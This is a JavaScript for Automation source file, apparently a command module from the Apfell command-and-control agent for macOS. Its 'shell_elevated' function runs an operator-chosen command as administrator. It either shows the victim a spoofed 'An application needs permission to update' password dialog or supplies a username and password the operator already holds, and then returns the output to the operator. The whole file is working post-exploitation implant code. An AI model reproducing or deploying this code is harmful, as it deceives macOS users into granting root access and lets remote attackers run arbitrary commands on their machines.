exports.shell_elevated = function(task, command, params){
    try{
        let response = "";
        let pieces = [];
        let cmd = "";
        if(params.length > 0){ pieces = JSON.parse(params); }
        else{ pieces = []; }
        if(pieces.hasOwnProperty('command') && pieces['command'] !== ""){ cmd = pieces['command']; }
        else{cmd = "whoami"; }
        let use_creds = false;
        let prompt = "An application needs permission to update";
        if(pieces.hasOwnProperty('use_creds') && typeof pieces['use_creds'] === "boolean"){ use_creds = pieces['use_creds'];}
        if(!use_creds){
            if(pieces.hasOwnProperty('prompt') && pieces['prompt'] !== ""){ prompt = pieces['prompt'];}
            try{
                response = currentApp.doShellScript(cmd, {administratorPrivileges:true,withPrompt:prompt});
            }
            catch(error){
                return JSON.stringify({"user_output":error.toString(), "completed": true, "status": "error"});
            }
        }
        else{
            let userName = apfell.user;
            let password = "";
            if(pieces.hasOwnProperty('user') && pieces['user'] !== ""){ userName = pieces['user']; }
            if(pieces.hasOwnProperty('credential')){ password = pieces['credential']; }
            try{
                response = currentApp.doShellScript(cmd, {administratorPrivileges:true, userName:userName, password:password});
            }
            catch(error){
                return JSON.stringify({"user_output":error.toString(), "completed": true, "status": "error"});
            }
        }
        response = response.replace(/\r/g, "\n");
        return JSON.stringify({"user_output":response, "completed": true});
    }catch(error){
        return JSON.stringify({"user_output":error.toString(), "completed": true, "status": "error"});
    }
};
COMMAND_ENDS_HERE